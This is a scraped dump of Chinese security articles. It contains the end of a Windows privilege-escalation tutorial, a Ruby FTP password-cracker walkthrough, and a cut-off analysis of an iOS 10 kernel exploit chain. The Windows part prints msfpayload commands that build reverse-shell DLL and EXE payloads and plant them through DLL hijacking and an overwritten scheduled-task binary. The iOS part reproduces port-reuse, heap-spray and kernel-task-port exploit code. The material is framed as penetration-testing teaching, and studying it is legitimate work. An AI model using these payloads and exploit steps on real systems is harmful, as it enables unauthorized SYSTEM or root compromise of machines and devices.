permissions]这个例子是一个特殊的DLL劫持实例，应用程序通常不能通过他们本身来实现一些功能，它们有很多需要hook的资源（大多数是DLL文件但是也有可能是一些专有文件）。如果一个程序或者服务从一个我们有写入权限的目录加载某个文件，那我们就可以利用这个特性来获得一个和这个程序运行权限相同权限的shell。通常，一个Windows应用将使用预定义的搜索路径去找上文所说的那个需要被加载的DLL，它将按照特定的顺序来检查这些路径。DLL劫持通常通过在这些路径的其中一个（同时要确保这个DLL文件在合法的DLL找到之前被找到）放置一个恶意的DLL文件来进行攻击。这种攻击方式可以通过让被攻击的应用程序对于它要使用的DLL文件，制定一个绝对的路径去放置它们来减轻危害。下面，你可以看到在32-bit操作系统上的DLL文件的搜索顺序：1 - 该应用程序所在的目录2 - 32-bit System directory (C:\Windows\System32)3 - 16-bit System directory (C:\Windows\System)4 - Windows directory (C:\Windows)5 - The current working directory (CWD)6 - Directories in the PATH environment variable (system then user)有时候，应用程序尝试加载并不存在于当前系统的DLL文件。导致这种情况的理由可能有很多，比如某个DLL文件仅仅被某些没有被安装的插件所需求。在这种情况下，Parvez发现了某些Windows服务尝试去加载不会被默认安装的DLL文件。既然上文所说的DLL文件不存在，那我们就可以遍历所有搜索路径（例如上文的1-6）来放置我们的恶意DLL文件，但作为一个低权限用户，将一个恶意的DLL文件放在1-4路径中的希望不大。因为我们正在攻击Windwos的服务，而不是某个应用程序，因此5是不可能的。虽然看似这种攻击方式有点难度，但是一旦我们找到符合要求的路径，就屌了。让我们看下这种攻击方式的实际应用，作为例子，我们将使用尝试去加载wlbsctrl.dll文件的的IKEEXT（IKE and AuthIP IPsec Keying Modules）服务。测试环境是：Win 7 ，低权限用户 C:\Users\user1\Desktop&gt; echo %username% user1通过下面的结果，可以判断出我们要成功了，因为在C盘下，如果有一个路径不是Windows默认的路径，那么我们就很可能会对它有写入的权限。 C:\Users\user1\Desktop&gt; echo %path% C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\; C:\Program Files\OpenVPN\bin;C:\Python27我们可以使用accesschk或者cacls来检查访问权限。 C:\Users\user1\Desktop&gt; accesschk.exe -dqv ""C:\Python27"" C:\Python27   Medium Mandatory Level (Default) [No-Write-Up]   RW BUILTIN\Administrators         FILE_ALL_ACCESS   RW NT AUTHORITY\SYSTEM         FILE_ALL_ACCESS   R  BUILTIN\Users         FILE_LIST_DIRECTORY         FILE_READ_ATTRIBUTES         FILE_READ_EA         FILE_TRAVERSE         SYNCHRONIZE         READ_CONTROL   RW NT AUTHORITY\Authenticated Users         FILE_ADD_FILE         FILE_ADD_SUBDIRECTORY         FILE_LIST_DIRECTORY         FILE_READ_ATTRIBUTES         FILE_READ_EA         FILE_TRAVERSE         FILE_WRITE_ATTRIBUTES         FILE_WRITE_EA         DELETE         SYNCHRONIZE         READ_CONTROL C:\Users\user1\Desktop&gt; cacls ""C:\Python27"" C:\Python27 BUILTIN\Administrators:(ID)F             BUILTIN\Administrators:(OI)(CI)(IO)(ID)F             NT AUTHORITY\SYSTEM:(ID)F             NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(ID)F             BUILTIN\Users:(OI)(CI)(ID)R             NT AUTHORITY\Authenticated Users:(ID)C             NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(ID)C在我们继续往下搞之前，我们需要检查一下IKEEXT服务的状态。在下面的例子中可以看出，它被设置成“AUTO_START”，所以它在系统启动后就自动运行了。 C:\Users\user1\Desktop&gt; sc qc IKEEXT [SC] QueryServiceConfig SUCCESS SERVICE_NAME: IKEEXT         TYPE               : 20  WIN32_SHARE_PROCESS         START_TYPE         : 2   AUTO_START         ERROR_CONTROL      : 1   NORMAL         BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k netsvcs         LOAD_ORDER_GROUP   :         TAG                : 0         DISPLAY_NAME       : IKE and AuthIP IPsec Keying Modules         DEPENDENCIES       : BFE         SERVICE_START_NAME : LocalSystem现在我们已经具备了攻击它的必需条件，我们可以生成一个恶意的DLL文件并且获得一个shell了。root@darkside:~# msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' O        Name: Windows Command Shell, Reverse TCP Inline      Module: payload/windows/shell_reverse_tcp    Platform: Windows        Arch: x86 Needs Admin: No  Total size: 314        Rank: Normal Provided by:   vlad902 &lt;vlad902@gmail.com&gt;   sf &lt;stephen_fewer@harmonysecurity.com&gt; Basic options: Name      Current Setting  Required  Description ----      ---------------  --------  ----------- EXITFUNC  process          yes       Exit technique: seh, thread, process, none LHOST     127.0.0.1        yes       The listen address LPORT     9988             yes       The listen port Description:   Connect back to attacker and spawn a command shell root@darkside:~# msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' D &gt;  /root/Desktop/evil.dll Created by msfpayload (http://www.metasploit.com). Payload: windows/shell_reverse_tcp  Length: 314 Options: {""lhost""=&gt;""127.0.0.1"", ""lport""=&gt;""9988""}在把恶意DLL传输到目标机器后，我们需要把它重命名为“wlbsctrl.dll”并且移动到""C:\Python27""目录下，然后我们需要耐心的等待机器重启（或者我们可以尝试强制让它重启），然后我们将获得一个SYSTEM权限的shell了。重要的再说一遍，下面的操作是用一个低权限的用户user1操作的。 C:\Users\user1\Desktop&gt; dir  Volume in drive C has no label.  Volume Serial Number is 948D-A98F  Directory of C:\Users\user1\Desktop 02/18/2014  01:49 PM    &lt;DIR&gt;          . 02/18/2014  01:49 PM    &lt;DIR&gt;          .. 04/22/2013  09:39 AM           331,888 accesschk.exe 02/18/2014  12:38 PM            14,336 evil.dll 01/25/2014  12:46 AM            36,864 fubar.exe 01/22/2014  08:17 AM    &lt;DIR&gt;          incognito2 06/30/2011  01:52 PM         1,667,584 ncat.exe 11/22/2013  07:39 PM             1,225 wmic_info.bat                5 File(s)      2,051,897 bytes                3 Dir(s)      73,052,160 bytes free C:\Users\user1\Desktop&gt; copy evil.dll C:\Python27\wlbsctrl.dll         1 file(s) copied. C:\Users\user1\Desktop&gt; dir C:\Python27  Volume in drive C has no label.  Volume Serial Number is 948D-A98F  Directory of C:\Python27 02/18/2014  01:53 PM    &lt;DIR&gt;          . 02/18/2014  01:53 PM    &lt;DIR&gt;          .. 10/20/2012  02:52 AM    &lt;DIR&gt;          DLLs 10/20/2012  02:52 AM    &lt;DIR&gt;          Doc 10/20/2012  02:52 AM    &lt;DIR&gt;          include 01/28/2014  03:45 AM    &lt;DIR&gt;          Lib 10/20/2012  02:52 AM    &lt;DIR&gt;          libs 04/10/2012  11:34 PM            40,092 LICENSE.txt 04/10/2012  11:18 PM           310,875 NEWS.txt 04/10/2012  11:31 PM            26,624 python.exe 04/10/2012  11:31 PM            27,136 pythonw.exe 04/10/2012  11:18 PM            54,973 README.txt 10/20/2012  02:52 AM    &lt;DIR&gt;          tcl 10/20/2012  02:52 AM    &lt;DIR&gt;          Tools 04/10/2012  11:31 PM            49,664 w9xpopen.exe 02/18/2014  12:38 PM            14,336 wlbsctrl.dll                7 File(s)        523,700 bytes                9 Dir(s)      73,035,776 bytes free万事俱备，只差重启。为了做演示，我使用Administrator用户手动的重启了这个被攻击的服务。最后的例子呢，让我们看一下计划任务。重新检查我们一开始搜集的关于计划任务的信息，我将对下面的条目进行讲解。 HostName:                             B33F TaskName:                             \LogGrabberTFTP Next Run Time:                        2/19/2014 9:00:00 AM Status:                               Ready Logon Mode:                           Interactive/Background Last Run Time:                        N/A Last Result:                          1 Author:                               B33F\b33f Task To Run:                          E:\GrabLogs\tftp.exe 10.1.1.99 GET log.out E:\GrabLogs\Logs\log.txt Start In:                             N/A Comment:                              N/A Scheduled Task State:                 Enabled Idle Time:                            Disabled Power Management:                     Stop On Battery Mode, No Start On Batteries Run As User:                          SYSTEM Delete Task If Not Rescheduled:       Enabled Stop Task If Runs X Hours and X Mins: 72:00:00 Schedule:                             Scheduling data is not available in this format. Schedule Type:                        Daily Start Time:                           9:00:00 AM Start Date:                           2/17/2014 End Date:                             N/A Days:                                 Every 1 day(s) Months:                               N/A Repeat: Every:                        Disabled Repeat: Until: Time:                  Disabled Repeat: Until: Duration:              Disabled Repeat: Stop If Still Running:        Disabled从上面的结果可以看到，有一个TFTP客户端，它会在一个时间点和一个远程主机进行连接，并且下载某些日志文件。它会在每天的上午九点运行，并且是用SYSTEM权限运行的（我的天呐）。让我们看下我们对这个路径是否有写入权限。C:\Users\user1\Desktop&gt; accesschk.exe -dqv ""E:\GrabLogs"" E:\GrabLogs   Medium Mandatory Level (Default) [No-Write-Up]   RW BUILTIN\Administrators         FILE_ALL_ACCESS   RW NT AUTHORITY\SYSTEM         FILE_ALL_ACCESS   RW NT AUTHORITY\Authenticated Users         FILE_ADD_FILE         FILE_ADD_SUBDIRECTORY         FILE_LIST_DIRECTORY         FILE_READ_ATTRIBUTES         FILE_READ_EA         FILE_TRAVERSE         FILE_WRITE_ATTRIBUTES         FILE_WRITE_EA         DELETE         SYNCHRONIZE         READ_CONTROL   R  BUILTIN\Users         FILE_LIST_DIRECTORY         FILE_READ_ATTRIBUTES         FILE_READ_EA         FILE_TRAVERSE         SYNCHRONIZE         READ_CONTROL C:\Users\user1\Desktop&gt; dir ""E:\GrabLogs""  Volume in drive E is More  Volume Serial Number is FD53-2F00  Directory of E:\GrabLogs 02/18/2014  11:34 PM    &lt;DIR&gt;          . 02/18/2014  11:34 PM    &lt;DIR&gt;          .. 02/18/2014  11:34 PM    &lt;DIR&gt;          Logs 02/18/2014  09:21 PM           180,736 tftp.exe                1 File(s)        180,736 bytes                3 Dir(s)   5,454,602,240 bytes free可以清楚地看到，这里有一个很严重的配置错误，对于这个计划任务来说，根本不需要使用SYSTEM的权限来运行，更糟糕的是，任何经过身份验证的用户都对这个文件夹有写入的权限。从渗透测试的合约来说，到了这一步我只需要生成一个木马，做一个后门（同时要保证它会完美的运行）就可以了，但是作为本次教学的例子，我们可以简单的用木马覆盖掉“tftp.exe”：root@darkside:~# msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' O        Name: Windows Command Shell, Reverse TCP Inline      Module: payload/windows/shell_reverse_tcp    Platform: Windows        Arch: x86 Needs Admin: No  Total size: 314        Rank: Normal Provided by:   vlad902 &lt;vlad902@gmail.com&gt;   sf &lt;stephen_fewer@harmonysecurity.com&gt; Basic options: Name      Current Setting  Required  Description ----      ---------------  --------  ----------- EXITFUNC  process          yes       Exit technique: seh, thread, process, none LHOST     127.0.0.1        yes       The listen address LPORT     9988             yes       The listen port Description:   Connect back to attacker and spawn a command shell root@darkside:~# msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' R | msfencode -t exe &gt; /root/Desktop/evil-tftp.exe [*] x86/shikata_ga_nai succeeded with size 341 (iteration=1)现在剩下的事就是上传我们的恶意文件，覆盖掉""E:\GrabLogs\tftp.exe""，一旦做完了就早点睡觉，防止因为猝死而看不到弹回来的shell。这里要注意的是，别忘了检查一下要入侵的计算机的时间和时区。C:\Users\user1\Desktop&gt; dir  Volume in drive C has no label.  Volume Serial Number is 948D-A98F  Directory of C:\Users\user1\Desktop 02/19/2014  01:36 AM    &lt;DIR&gt;          . 02/19/2014  01:36 AM    &lt;DIR&gt;          .. 04/22/2013  09:39 AM           331,888 accesschk.exe 02/19/2014  01:31 AM            73,802 evil-tftp.exe 01/25/2014  12:46 AM            36,864 fubar.exe 01/22/2014  08:17 AM    &lt;DIR&gt;          incognito2 06/30/2011  01:52 PM         1,667,584 ncat.exe 02/18/2014  12:38 PM            14,336 wlbsctrl.dll 11/22/2013  07:39 PM             1,225 wmic_info.bat                6 File(s)      2,125,699 bytes                3 Dir(s)      75,341,824 bytes free C:\Users\user1\Desktop&gt; copy evil-tftp.exe E:\GrabLogs\tftp.exe Overwrite E:\GrabLogs\tftp.exe? (Yes/No/All): Yes         1 file(s) copied.这两个例子给了你提权的思路，当我们检查文件或文件夹权限的时候，需要考虑哪些点事易受攻击的点。你需要花费时间来检查所有的启动路径，Windows服务，计划任务和Windows启动项。通过上面的各个例子，我们可以看出accesschk称得上是杀人越货的必备工具，在文章结束之前，我想给你一些在使用accesschk上的建议。当第一次执行任何sysinternals工具包里的工具时，当前用户将会看到一个最终用户许可协议弹框，这是一个大问题，然而我们可以添加一个额外的参数“/accepteula”去自动接受许可协议。 accesschk.exe /accepteula ... ... ... 找出某个驱动器下所有权限配置有缺陷的文件夹路径 accesschk.exe -uwdqs Users c:\ accesschk.exe -uwdqs ""Authenticated Users"" c:\ 找出某个驱动器下所有权限配置有缺陷的文件路径 accesschk.exe -uwqs Users c:\*.* accesschk.exe -uwqs ""Authenticated Users"" c:\*.*总结这份指南写的是Windows提权的一些基本套路，如果你想真正的精通Windows提权，你需要投入大量的精力去研究。对于渗透测试的各个阶段，信息搜集环节总是最关键的，你对目标机器了解的越多，你的思路就越猥琐，你成功的几率就越大。有时候你会将你的权限提升到Administrator，从Administrator提升到SYSTEM权限是不成问题的，你依旧可以重新配置一个服务，或者创建一个用SYSTEM权限运行的计划任务。现在，搞起来搞起来搞起来！SYSTEMSYSTEMSYSTEM！传送门【技术分享】Windows下的渗透测试之提权的基本套路（上）","2016-11-07 14:55:20","Web安全","Windows下的渗透测试之提权的基本套路（下）","http://nsoad.com/Article/web/20161107/716.html"
"5ccbfaee4f2f0a0a7a69c0eb","这篇文章我将带大家利用Ruby，来构建我们自己的FTP密码破解器。并希望通过这个例子，让大家明白暴力攻击的概念及其重要性。好了话不多说，下面让我们开始吧！","secist","这篇文章我将带大家利用Ruby，来构建我们自己的FTP密码破解器。并希望通过这个例子，让大家明白暴力攻击的概念及其重要性。好了话不多说，下面让我们开始吧！何为暴力攻击？暴力攻击这个词，其实对于许多安全圈的小伙伴来说都并不陌生，可谓是简单粗暴。但对于许多攻击者而言，暴力攻击却是不可或缺的一种攻击手段。在实际应用中，由于暴力攻击需要消耗大量的时间和资源，因此往往都不会成为攻击者首选的方案，但它却会是攻击者最后的选项。例如我们设置一个如下场景：你现在想要访问你所在公司的FTP（文件传输协议）服务器。你几乎尝试了所有可能获取账号密码的方法，但由于目标FTP服务器安全性做的非常的好也不存在任何安全漏洞，同时该公司的员工安全意识也非常的强，你也无法进行社会工程学的攻击。面对这种几近极端的情况，最终你不得不采取暴力攻击的方式。首先，你会需要提前准备一个用于暴力破解的攻击字典。然后将字典拖放到密码破解工具的指定位置，密码破解工具会对字典中的单词列表进行逐一尝试并尝试登陆FTP服务器，直至匹配出正确的FTP服务密码。简单吧？虽然暴力攻击非常简单粗暴，但它的威力却不容小觑。有时它将决定我们渗透测试的成败与否！下面，让我们来构建一个属于我们自己的FTP密码破解器吧！构建属于自己的FTP密码破解器这里我们将会使用到Ruby脚本，来构建我们的FTP密码破解器。如果你不是很了解Ruby脚本，不用担心，我已经为大家准备了Ruby的基础教程，该教程涵盖了本文中所用到的一些Ruby基础知识，因此我建议大家在阅读本文之前，先去掌握一些Ruby的基础知识，以便更好地阅读本文。下面我们直接进入代码部分。就像Python脚本一样，在代码起始位置我们需要声明为Ruby脚本，并引入我们所需的函数库以及获取用户的输入信息：这里我们只需要两个库文件。我们需要利用socket库与FTP服务器进行通信，以进行暴力破解的尝试登录连接操作。而timeout库则用于设置与目标服务器之间的第一次超时时间，如果服务器无法访问，则会向我们返回超时提示。接下来我们需要检查ARGV列表的长度。该列表会在脚本启动时生成，列表中包含了用户从命令行顺序输入的所有参数。这里我们使用的unless语句相当于if not，如果这里ARGV接收的参数长度不等于3那么，该脚本将会打印使用规则并退出。以下这段代码将会开始尝试连接目标服务器，并检查目标服务器是否可正常通信：以上代码我们简单的使用了socket库并丢了个IP地址，来建立与目标服务器的通信连接。同时，我们使用了timeout库做了一个十秒钟的超时循环，如果连接在十秒内未完成，脚本将会在客户端界面提示用户并关闭脚本。有了这些基本的功能后，下面我们使用以下函数来读取用户的字典列表文件：这个功能函数的实现其实非常简单。我们将文件路径作为函数的一个参数，并打印读取的单词列表。然后我们利用file.open()函数来打开文件，并读取文件内容。在读取文件时，我们以每行文本末尾的‘\n’换行符来分割列表中的内容，这样我们就能获取到我们需要的密码列表了。随后我们会将该列表存储在全局变量中，并将文件关闭进行下一步的操作。如果文件读取失败，脚本将会在客户端界面提示用户，并退出脚本。现在我们已经具备了以上两个FTP密码破解器的基本功能函数，接下来我们就可以来实际构建尝试登录到服务器的功能函数了：这个函数非常重要，因为它将为我们进行实际的破解操作。这里我们首先创建了一个新的TCP套接字并将其连接到FTP服务器，然后我们等待FTP服务器的banner响应。当我们成功接收banner响应后，我们开始输入我们的用户名，并等待密码输入提示，接着我们将密码尝试发送到服务器。这时，我们将从服务器接收数据，并将其存储在一个变量中。该数据将会包含我们尝试登录的结果。我们通过字符串“230”来判断，我们是否成功登陆目标FTP服务器（“230”为FTP成功登录的响应码）。否则返回false。到此为止，我们的FTP密码破解器已基本成型，最后我们要做的就是调用并整合以上的功能函数，开始执行我们的暴力攻击：以上代码将调用我们之前创建的函数，并对目标FTP服务器进行检查以及读取我们提供的字典列表文件。接着我们将开始对目标FTP服务器进行攻击，这里使用了一个循环，将对用户提供的单词列表进行逐一尝试。如果最终密码成功匹配，脚本将会将破解结果返回给用户，并关闭脚本。下面让我们来测试下我们的成果！暴力攻击测试首先，我将创建一个字典文件。由于这只是一个例子，因此我的字典文件非常的简短。但在实际环境中，一般情况下我们都需要使用非常大的字典文件。以下是我创建的单词列表：我们来运行我们的脚本，可以看到这里有一个简单的使用提示：现在，我们根据该脚本的使用规则提供相应的参数值，并执行脚本。经过一段时间的等待，我们可以看到FTP服务器密码被成功爆破：总结正如我开头所说的，暴力攻击虽然简单粗暴，但对于攻击者而言它有时将会决定我们渗透的成败与否。因此作为我们安全测试人员，对于深入了解暴力攻击的过程及原理有着非同寻常的意义。","2017-04-07 14:19:50","安全工具","如何使用Ruby构建FTP密码破解器","http://nsoad.com/Security-tools/20170407/tools-1129.html"
"5ccbfaee4f2f0a0a7a69c0ec","前不久GP0的研究员Ian Beer公布了针对iOS 10.1.1的漏洞细节及利用代码，通过结合三个漏洞获取设备的root shell。之后意大利研究员@qwertyoruiopz在此基础上加入....","windknown","前不久GP0的研究员Ian Beer公布了针对iOS 10.1.1的漏洞细节及利用代码，通过结合三个漏洞获取设备的root shell。之后意大利研究员@qwertyoruiopz在此基础上加入绕过KPP保护的漏洞利用并发布了完整的iOS10越狱。Ian Beer已经对漏洞的成因和利用做了相关描述，这里将不再阐述，而是介绍一些利用的细节以及可能的改进建议。整个exploit chain包含了三个漏洞：CVE-2016-7637 用于替换了launchd进程中往com.apple.iohideventsystem发消息的portCVE-2016-7661 造成powerd崩溃重启，从而在接管com.apple.iohideventsystem后获取powerd的task port，进而获取host_privCVE-2016-7644 导致内核port的UAF，进一步获取kernel_task替换launchd中的port内核中的ipc_object对象对应到用户态下是一个name（int类型），每个进程的ipc_space_t中保存了name与object之间的映射关系。相关代码可以在ipc_entry.c中查看，ipc_entry_lookup函数将返回name对应的ipc_entry_t结构，其中保存了对应的object。name的高24位是table中的索引，而低8位是generation number（初始值是-1，增加步长是4，因此一共有64个值）#define    MACH_PORT_INDEX(name)       ((name) &gt;&gt; 8)#define    MACH_PORT_GEN(name)     (((name) &amp; 0xff) &lt;&lt; 24)#define    MACH_PORT_MAKE(index, gen)  \        (((index) &lt;&lt; 8) | (gen) &gt;&gt; 24)被释放的name会被标记到freelist的起始位置，当再创建的时候会有相同的索引号，但是generation number会增加4，因此当被重复释放和分配64次后会返回给用户态完全相同的name，从而可以完成劫持。#define    IE_BITS_GEN_MASK    0xff000000  /* 8 bits for generation */#define    IE_BITS_GEN(bits)   ((bits) &amp; IE_BITS_GEN_MASK)#define    IE_BITS_GEN_ONE     0x04000000  /* low bit of generation */#define IE_BITS_NEW_GEN(old)   (((old) + IE_BITS_GEN_ONE) &amp; IE_BITS_GEN_MASK)简单的测试代码    for (int i=0; i&lt;65; i++)    {        mach_port_t port = 0;        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;port);        printf(""port index:0x%x gen:0x%x\n"", (port &gt;&gt; 8), (port &amp; 0xff));        mach_port_destroy(mach_task_self(), port);    }在实际利用漏洞的时候，需要在launchd的进程空间内重用name，因此可以发送一个launchd接受的id的消息，就能完成一次分配和释放（send_looper函数）。为了避免name释放后被抢占，首先调用了一次send_looper将要占用的name移动到freelist的末端相对安全的位置，进而再次调用62次来递增generation number，最后一次通过注册服务抢占name，完成了中间人劫持。    // send one smaller looper message to push the free'd name down the free list:    send_looper(bootstrap_port, ports, 0x100, MACH_MSG_TYPE_MAKE_SEND);    // send the larger ones to loop the generation number whilst leaving the name in the middle of the long freelist    for (int i = 0; i &lt; 62; i++) {        send_looper(bootstrap_port, ports, 0x200, MACH_MSG_TYPE_MAKE_SEND);    }    // now that the name should have looped round (and still be near the middle of the freelist    // try to replace it by registering a lot of new services    for (int i = 0; i &lt; n_ports; i++) {        kern_return_t err = bootstrap_register(bootstrap_port, names[i], ports[i]);        if (err != KERN_SUCCESS) {            printf(""failed to register service %d, continuing anyway...\n"", i);        }    }使powerd崩溃powerd在接收到MACH_NOTIFY_DEAD_NAME消息后没有检查发送者及port，就直接调用mach_port_deallocate去释放。利用代码中将被释放的port设置为0x103，该port应该是本进程的task port，一旦被释放后任何的内存分配处理都会直接出错。代码如下    mach_port_t service_port = lookup(""com.apple.PowerManagement.control"");    // free task_self in powerd    for (int j = 0; j &lt; 2; j++) {        spoof(service_port, 0x103);    }    // call _io_ps_copy_powersources_info which has an unchecked vm_allocate which will fail    // and deref an invalid pointer    vm_address_t buffer = 0;    vm_size_t size = 0;    int return_code;    io_ps_copy_powersources_info(service_port,                                 0,                                 &amp;buffer,                                 (mach_msg_type_number_t *) &amp;size,                                 &amp;return_code);在测试过程中发现有的设备的mach_task_self()返回的并不是0x103，因此可以增加循环处理的代码来加强利用的适应性。    // free task_self in powerd    for (int port = 0x103; port &lt; 0x1003; port += 4) {        for (int j = 0; j &lt; 2; j++) {            spoof(service_port, port);        }    }内核堆跨Zone攻击CVE-2016-7644可以通过race造成内核port对象的UAF，因此第一步需要在port对象被释放后重新去填充。由于所有的port都被分配在特殊的”ipc ports”的zone里，无法使用常见的分配kalloc zone的方式来直接填充内存。因此利用代码首先分配大量port然后释放，再调用mach_zone_force_gc将这些页面释放掉，此后可以在通过kalloc zone里spray内存来占用。port对象的大小是0xA8（64位），其中ip_context成员（0x90偏移）可以通过用户态API读写的，Ian Beer选择了一种比较巧妙的方式来填充port对象。首先需要了解mach msg中对MACH_MSG_OOL_PORTS_DESCRIPTOR的处理，内核收到复杂消息后发现是port descriptor后会交给ipc_kmsg_copyin_ool_ports_descriptor函数读入所有的port对象。该函数会调用kalloc分配需要的内存（64位下分配的内存是输入的2倍，name长度是4字节），然后将有效的port由name转换成真实对象地址保存，对于输入是0的name任然会填充0。    /* calculate length of data in bytes, rounding up */    ports_length = count * sizeof(mach_port_t);    names_length = count * sizeof(mach_port_name_t);    ...    data = kalloc(ports_length);    ...#ifdef __LP64__    mach_port_name_t *names = &amp;((mach_port_name_t *)data)[count];#else    mach_port_name_t *names = ((mach_port_name_t *)data);#endif    if (copyinmap(map, addr, names, names_length) != KERN_SUCCESS) {        ...    }    objects = (ipc_object_t *) data;    dsc-&gt;address = data;    for ( i = 0; i &lt; count; i++) {        mach_port_name_t name = names[i];        ipc_object_t object;        if (!MACH_PORT_VALID(name)) {            objects[i] = (ipc_object_t)CAST_MACH_NAME_TO_PORT(name);            continue;        }        kern_return_t kr = ipc_object_copyin(space, name, user_disp, &amp;object);        ...        objects[i] = object;    }如果我们将输入ool port数据的恰当位置的name设置为之前获取的host_priv，那么在内核处理后，host_priv对应的内核object地址会被保存在UAF的port的ip_context成员位置，从而在用户态就可以读取到HOST_PRIV_PORT这个port的真实地址。用于填充内存的代码在send_ool_ports函数，每个descriptor会分配一个kalloc.4096(0x200*8)，一个消息会在内核分配1000个4KB的页面。    size_t n_ports = 0x200;    mach_port_t* ports = calloc(sizeof(mach_port_t), n_ports);    uint32_t obj_offset = 0x90;    for (int i = 0; i &lt; n_ports_in_zone; i++) {        uint32_t index = (obj_offset &amp; 0xfff) / 8;        ports[index] = to_send;        obj_offset += 0xa8;    }    // build a message with those ool ports:    struct ool_multi_msg* leak_msg = malloc(sizeof(struct ool_multi_msg));    memset(leak_msg, 0, sizeof(struct ool_msg));    leak_msg-&gt;hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);    leak_msg-&gt;hdr.msgh_size = sizeof(struct ool_msg);    leak_msg-&gt;hdr.msgh_remote_port = q;    leak_msg-&gt;hdr.msgh_local_port = MACH_PORT_NULL;    leak_msg-&gt;hdr.msgh_id = 0x41414141;    leak_msg-&gt;body.msgh_descriptor_count = 1000;    for (int i = 0; i &lt; 1000; i++) {        leak_msg-&gt;ool_ports[i].address = ports;        leak_msg-&gt;ool_ports[i].count = n_ports;        leak_msg-&gt;ool_ports[i].deallocate = 0;        leak_msg-&gt;ool_ports[i].disposition = MACH_MSG_TYPE_COPY_SEND;        leak_msg-&gt;ool_ports[i].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;        leak_msg-&gt;ool_ports[i].copy = MACH_MSG_PHYSICAL_COPY;    }成功填充被释放的port后，即可以读取context的值。    // get the target page reused by the ool port pointers    for (int i = 0; i &lt; n_ool_port_qs; i++) {        ool_port_qs[i] = send_ool_ports(host_priv);    }    uint64_t context = 123;    mach_port_get_context(mach_task_self(), middle_ports[0], &amp;context);    printf(""read context value: 0x%llx\n"", context);获取kernel task portHOST_PRIV_PORT这个port是在系统初始化函数kernel_bootstrap里的调用ipc_init创建的，而kernel task port在之后的task_init中创建，因此很大概率这两个port对象在比较接近的内存位置。voidkernel_bootstrap(void){    ...    kernel_bootstrap_log(""ipc_init"");    ipc_init();    kernel_bootstrap_log(""PMAP_ACTIVATE_KERNEL"");    PMAP_ACTIVATE_KERNEL(master_cpu);    kernel_bootstrap_log(""mapping_free_prime"");    mapping_free_prime();                       /* Load up with temporary mapping blocks */    kernel_bootstrap_log(""machine_init"");    machine_init();    kernel_bootstrap_log(""clock_init"");    clock_init();    ledger_init();    kernel_bootstrap_log(""task_init"");    task_init();    ...}上文提到kernel接收MACH_MSG_OOL_PORTS_DESCRIPTOR时候的copyin处理，同样在把消息还给用户态时有copyout的处理，会将真实的port对象地址转换成name还给用户态。可以将UAF的port的context设置成HOST_PRIV_PORT地址附近的port地址，用户态获取name后通过pid_for_task检查是否成功获取kernel task的port。receive_ool_ports函数接收之前发送填充的消息，并检查返回值找到可能的kernel task port。    struct ool_multi_msg_rcv msg = {0};    err = mach_msg(&amp;msg.hdr,                   MACH_RCV_MSG,                   0,                   sizeof(struct ool_multi_msg_rcv),                   q,                   0,                   0);    if (err != KERN_SUCCESS) {        printf(""failed to receive ool ports msg (%s)\n"", mach_error_string(err));        exit(EXIT_FAILURE);    }    mach_port_t interesting_port = MACH_PORT_NULL;    mach_port_t kernel_task_port = MACH_PORT_NULL;    for (int i = 0; i &lt; 1000; i++) {        mach_msg_ool_ports_descriptor_t* ool_desc = &amp;msg.ool_ports[i];        mach_port_t* ool_ports = (mach_port_t*)ool_desc-&gt;address;        for (size_t j = 0; j &lt; ool_desc-&gt;count; j++) {            mach_port_t port = ool_ports[j];            if (port == expected) {                ;            } else if (port != MACH_PORT_NULL) {                interesting_port = port;                printf(""found an interesting port 0x%x\n"", port);                if (kernel_task_port == MACH_PORT_NULL &amp;&amp;                    is_port_kernel_task_port(interesting_port, valid_kernel_pointer))                {                    kernel_task_port = interesting_port;                }            }        }        mach_vm_deallocate(mach_task_self(), (mach_vm_address_t)ool_desc-&gt;address, ((ool_desc-&gt;count*4)+0xfff)&amp;~0xfff);    }利用代码中准备了0x20个UAF的port，然后从HOST_PRIV_PORT地址所在的zone的页面的中间部分开始猜测。    for (int i = 0; i &lt; n_middle_ports; i++) {        // guess the middle slots in the zone block:        mach_port_set_context(mach_task_self(), middle_ports[i], pages_base+(0xa8 * ((n_ports_in_zone/2) - (n_middle_ports/2) + i)));    }    mach_port_t kernel_task_port = MACH_PORT_NULL;    for (int i = 0; i &lt; n_ool_port_qs; i++) {        mach_port_t new_port = receive_ool_ports(ool_port_qs[i], host_priv, pages_base);        if (new_port != MACH_PORT_NULL) {            kernel_task_port = new_port;        }    }增加准备的UAF的port的数量（最多可增加至port的zone的页面的容量）可以提高命中率。此外上述代码的一处改进是在接收消息前再分配一些port，由于HOST_PRIV_PORT所在的zone的页面可能存在被释放了的port地址，在copyout时候会导致panic，因此填补这些空洞可以提高稳定性。设备差异性iOS的内核堆是由zone来管理的，具体代码可以在zalloc.c中查看。每个zone对应的页面大小计算在zinit函数中，其中ZONE_MAX_ALLOC_SIZE固定为0x8000。    if (alloc == 0)        alloc = PAGE_SIZE;    alloc = round_page(alloc);    max   = round_page(max);    vm_size_t best_alloc = PAGE_SIZE;    vm_size_t alloc_size;    for (alloc_size = (2 * PAGE_SIZE); alloc_size &lt;= ZONE_MAX_ALLOC_SIZE; alloc_size += PAGE_SIZE) {        if (ZONE_ALLOC_FRAG_PERCENT(alloc_size, size) &lt; ZONE_ALLOC_FRAG_PERCENT(best_alloc, size)) {            best_alloc = alloc_size;        }    }    alloc = best_alloc;值得注意的是PAGE_SIZE在iOS下可能是0x1000或0x4000，通过观察PAGE_SHIFT_CONST的初始化可以知道当RAM大于1GB（0x40000000）的时候PAGE_SIZE=0x4000，否则PAGE_SIZE=0x1000  if ( v139 )  {    v14 = 14;    if ( *(_QWORD *)(a1 + 24) &lt;= 0x40000000uLL )      v15 = 12;    else      v15 = 14;  }  else  {    if ( (unsigned int)sub_FFFFFFF0074F2BE4(""-use_hwpagesize"", &amp;v142, 